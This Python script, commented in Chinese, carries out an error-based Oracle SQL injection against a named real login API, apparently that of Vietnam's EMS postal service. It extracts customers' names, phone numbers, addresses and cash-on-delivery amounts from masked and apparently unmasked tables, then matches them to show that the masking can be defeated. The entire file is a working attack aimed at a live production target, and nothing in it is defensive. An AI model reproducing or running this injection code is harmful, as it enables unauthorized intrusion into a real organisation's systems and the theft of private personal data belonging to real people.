#!/usr/bin/env python3
"""
验证脱敏数据和真实数据是否真的能对上
通过对比电话后4位、姓名、代收金额等来验证
"""

import requests
import json
import time

class DataMatchVerifier:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def verify_phone_matching(self):
        """验证电话后4位是否匹配"""
        print("=" * 80)
        print("🔍 验证1: 电话后4位匹配测试")
        print("=" * 80)
        
        date = '20251010'
        test_mabcs = ['701000', '236160', '700916']
        
        for mabc in test_mabcs:
            print(f"\n{'='*80}")
            print(f"测试MABC: {mabc}")
            print(f"{'='*80}")
            
            # 从脱敏表获取电话
            query1 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL AND ROWNUM=1"
            masked_phone = self.extract_via_error(query1)
            
            if masked_phone:
                print(f"脱敏表电话: {masked_phone}")
                
                # 提取后4位
                last4 = masked_phone[-4:] if len(masked_phone) >= 4 else ""
                print(f"后4位: {last4}")
                
                # 从真实表获取电话
                query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND DIENTHOAINHAN!='0999999999' AND ROWNUM=1"
                real_phone = self.extract_via_error(query2)
                
                if real_phone:
                    print(f"真实表电话: {real_phone}")
                    
                    # 验证后4位是否匹配
                    real_last4 = real_phone[-4:] if len(real_phone) >= 4 else ""
                    
                    if last4 == real_last4:
                        print(f"✅ 匹配成功！后4位都是: {last4}")
                    else:
                        print(f"❌ 不匹配！脱敏:{last4} vs 真实:{real_last4}")
                else:
                    print(f"⚠️  真实表未找到数据")
            
            time.sleep(3)
    
    def verify_amount_matching(self):
        """验证代收金额是否匹配"""
        print("\n" + "=" * 80)
        print("🔍 验证2: 代收金额匹配测试")
        print("=" * 80)
        
        date = '20251010'
        test_mabcs = ['701000', '236160', '700916', '725231']
        
        for mabc in test_mabcs:
            print(f"\n{'='*80}")
            print(f"测试MABC: {mabc}")
            print(f"{'='*80}")
            
            # 脱敏表的代收金额
            query1 = f"SELECT SO_TIEN_THU_HO FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            masked_amount = self.extract_via_error(query1)
            
            # 真实表的代收金额
            query2 = f"SELECT SO_TIEN_THU_HO FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            real_amount = self.extract_via_error(query2)
            
            if masked_amount:
                print(f"脱敏表代收: {masked_amount} VND")
            
            if real_amount:
                print(f"真实表代收: {real_amount} VND")
            
            if masked_amount and real_amount:
                if masked_amount == real_amount:
                    print(f"✅ 代收金额匹配！都是: {masked_amount} VND")
                else:
                    print(f"⚠️  代收金额不同：脱敏{masked_amount} vs 真实{real_amount}")
            
            time.sleep(2)
    
    def verify_date_matching(self):
        """验证日期是否匹配"""
        print("\n" + "=" * 80)
        print("🔍 验证3: 日期匹配测试")
        print("=" * 80)
        
        date = '20251010'
        test_mabcs = ['701000', '236160']
        
        for mabc in test_mabcs:
            print(f"\n测试MABC: {mabc}")
            
            # 脱敏表日期
            query1 = f"SELECT NGAY FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            masked_date = self.extract_via_error(query1)
            
            # 真实表日期
            query2 = f"SELECT NGAY FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            real_date = self.extract_via_error(query2)
            
            if masked_date:
                print(f"  脱敏表日期: {masked_date}")
            
            if real_date:
                print(f"  真实表日期: {real_date}")
                
                if masked_date == real_date:
                    print(f"  ✅ 日期匹配！")
                else:
                    print(f"  ❌ 日期不匹配！")
            
            time.sleep(2)
    
    def verify_name_matching(self):
        """验证姓名是否匹配（去掉+号后）"""
        print("\n" + "=" * 80)
        print("🔍 验证4: 姓名匹配测试")
        print("=" * 80)
        
        date = '20251010'
        test_mabcs = ['701000', '100916']
        
        for mabc in test_mabcs:
            print(f"\n{'='*80}")
            print(f"测试MABC: {mabc}")
            print(f"{'='*80}")
            
            # 脱敏表姓名
            query1 = f"SELECT NGUOINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND NGUOINHAN IS NOT NULL AND ROWNUM=1"
            masked_name = self.extract_via_error(query1)
            
            # 真实表姓名
            query2 = f"SELECT NGUOINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            real_name = self.extract_via_error(query2)
            
            if masked_name:
                print(f"脱敏表姓名: {masked_name}")
                # 去掉+号
                unmasked = masked_name.replace('+', '')
                print(f"去掉+号后: {unmasked}")
            
            if real_name:
                print(f"真实表姓名: {real_name}")
                
                # 检查是否包含
                if masked_name and unmasked.lower() in real_name.lower():
                    print(f"✅ 姓名匹配！真实姓名包含脱敏部分")
                elif masked_name and real_name:
                    print(f"⚠️  姓名可能不完全匹配")
            
            time.sleep(2)
    
    def comprehensive_verification(self):
        """综合验证：选一个订单，对比所有字段"""
        print("\n" + "=" * 80)
        print("🔍 验证5: 综合验证（完整对比）")
        print("=" * 80)
        
        date = '20251010'
        mabc = '700916'  # 使用之前成功的MABC
        
        print(f"\n测试MABC: {mabc}")
        print(f"{'='*80}")
        
        print("\n【脱敏表数据 - E1E2_PH】")
        
        fields = [
            ('NGAY', '日期'),
            ('NGUOINHAN', '收件人'),
            ('DIENTHOAINHAN', '收件电话'),
            ('DIACHI', '地址'),
            ('NGUOIGUI', '发件人'),
            ('DIENTHOAIGUI', '发件电话'),
            ('SO_TIEN_THU_HO', '代收金额'),
        ]
        
        masked_data = {}
        
        for field, label in fields:
            query = f"SELECT {field} FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            value = self.extract_via_error(query)
            if value and value != 'NULL':
                print(f"  {label:10} : {value}")
                masked_data[field] = value
            time.sleep(1)
        
        print("\n【真实表数据 - E1E2_PH_TEMP_DATA2_LOG】")
        
        real_data = {}
        
        for field, label in fields:
            query = f"SELECT {field} FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            value = self.extract_via_error(query)
            if value and value != 'NULL':
                print(f"  {label:10} : {value}")
                real_data[field] = value
            time.sleep(1)
        
        # 对比验证
        print(f"\n{'='*80}")
        print("📊 验证结果:")
        print(f"{'='*80}")
        
        # 验证电话后4位
        if 'DIENTHOAINHAN' in masked_data and 'DIENTHOAINHAN' in real_data:
            masked_phone = masked_data['DIENTHOAINHAN']
            real_phone = real_data['DIENTHOAINHAN']
            
            if len(masked_phone) >= 4 and len(real_phone) >= 4:
                masked_last4 = masked_phone[-4:]
                real_last4 = real_phone[-4:]
                
                if masked_last4 == real_last4:
                    print(f"\n✅ 电话后4位匹配: {masked_last4}")
                else:
                    print(f"\n❌ 电话后4位不匹配: {masked_last4} vs {real_last4}")
        
        # 验证代收金额
        if 'SO_TIEN_THU_HO' in masked_data and 'SO_TIEN_THU_HO' in real_data:
            if masked_data['SO_TIEN_THU_HO'] == real_data['SO_TIEN_THU_HO']:
                print(f"✅ 代收金额匹配: {masked_data['SO_TIEN_THU_HO']} VND")
            else:
                print(f"❌ 代收金额不匹配: {masked_data['SO_TIEN_THU_HO']} vs {real_data['SO_TIEN_THU_HO']}")
        
        # 验证日期
        if 'NGAY' in masked_data and 'NGAY' in real_data:
            if masked_data['NGAY'] == real_data['NGAY']:
                print(f"✅ 日期匹配: {masked_data['NGAY']}")
            else:
                print(f"❌ 日期不匹配: {masked_data['NGAY']} vs {real_data['NGAY']}")
    
    def test_multiple_mabcs(self):
        """测试多个MABC验证匹配度"""
        print("\n" + "=" * 80)
        print("🔍 验证6: 批量测试匹配度（10个MABC）")
        print("=" * 80)
        
        date = '20251010'
        
        # 获取10个有电话的MABC
        print("\n获取10个有电话的MABC进行测试...")
        
        match_count = 0
        mismatch_count = 0
        not_found_count = 0
        
        for i in range(1, 11):
            query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL) WHERE RN={i}"
            mabc = self.extract_via_error(query_mabc)
            
            if mabc:
                print(f"\n测试{i}: MABC={mabc}")
                
                # 脱敏电话
                query1 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                masked = self.extract_via_error(query1)
                
                # 真实电话
                query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND DIENTHOAINHAN!='0999999999' AND ROWNUM=1"
                real = self.extract_via_error(query2)
                
                if masked and real:
                    masked_last4 = masked[-4:] if len(masked) >= 4 else ""
                    real_last4 = real[-4:] if len(real) >= 4 else ""
                    
                    print(f"  脱敏: {masked}")
                    print(f"  真实: {real}")
                    
                    if masked_last4 == real_last4:
                        print(f"  ✅ 匹配！后4位都是 {masked_last4}")
                        match_count += 1
                    else:
                        print(f"  ❌ 不匹配！{masked_last4} vs {real_last4}")
                        mismatch_count += 1
                elif masked and not real:
                    print(f"  脱敏: {masked}")
                    print(f"  ⚠️  真实表未找到")
                    not_found_count += 1
                
                time.sleep(2)
        
        # 统计结果
        print(f"\n{'='*80}")
        print("📊 匹配度统计:")
        print(f"{'='*80}")
        print(f"  ✅ 匹配: {match_count}/10")
        print(f"  ❌ 不匹配: {mismatch_count}/10")
        print(f"  ⚠️  未找到: {not_found_count}/10")
        
        if match_count >= 7:
            print(f"\n✅ 匹配度高！可以信任MABC关联方法")
        elif match_count >= 4:
            print(f"\n⚠️  匹配度中等，需要谨慎验证")
        else:
            print(f"\n❌ 匹配度低！MABC关联可能不可靠")
    
    def check_same_mabc_in_both_tables(self):
        """检查同一MABC在两个表中的完整记录"""
        print("\n" + "=" * 80)
        print("🔍 验证7: 同一MABC的完整数据对比")
        print("=" * 80)
        
        date = '20251010'
        mabc = '236160'
        
        print(f"\n完整对比 MABC={mabc}:")
        print(f"{'='*80}")
        
        # E1E2_PH表（脱敏）
        print("\n【表1: E1E2_PH（脱敏表）】")
        
        query1 = f"SELECT NGUOINHAN||','||DIENTHOAINHAN||','||DIACHI||','||SO_TIEN_THU_HO FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
        data1 = self.extract_via_error(query1)
        if data1:
            parts = data1.split(',')
            if len(parts) >= 4:
                print(f"  收件人: {parts[0]}")
                print(f"  电话: {parts[1]}")
                print(f"  地址: {parts[2]}")
                print(f"  代收: {parts[3]} VND")
        
        time.sleep(2)
        
        # TEMP_DATA2_LOG表（真实）
        print("\n【表2: E1E2_PH_TEMP_DATA2_LOG（真实表）】")
        
        query2 = f"SELECT NGUOINHAN||','||DIENTHOAINHAN||','||DIACHI||','||SO_TIEN_THU_HO FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
        data2 = self.extract_via_error(query2)
        if data2:
            parts = data2.split(',')
            if len(parts) >= 4:
                print(f"  收件人: {parts[0]}")
                print(f"  电话: {parts[1]}")
                print(f"  地址: {parts[2]}")
                print(f"  代收: {parts[3]} VND")
        
        time.sleep(2)
        
        print(f"\n{'='*80}")
        print("对比分析:")
        print(f"{'='*80}")
        
        if data1 and data2:
            print("✅ 两个表都找到了MABC={mabc}的数据")
            print("可以通过对比判断是否匹配")
        elif data1 and not data2:
            print("⚠️  只在脱敏表找到，真实表没有")
            print("说明：真实表可能没有这个MABC的数据")
        elif not data1 and data2:
            print("⚠️  只在真实表找到，脱敏表没有")
        else:
            print("❌ 两个表都没找到")
    
    def run_verification(self):
        """执行所有验证"""
        print("=" * 80)
        print("✅ 脱敏数据 vs 真实数据匹配验证工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行所有验证
        self.verify_phone_matching()
        self.verify_amount_matching()
        self.verify_date_matching()
        self.verify_name_matching()
        self.comprehensive_verification()
        self.test_multiple_mabcs()
        self.check_same_mabc_in_both_tables()
        
        print("\n" + "=" * 80)
        print("🎉 验证完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    verifier = DataMatchVerifier(target_url)
    verifier.run_verification()
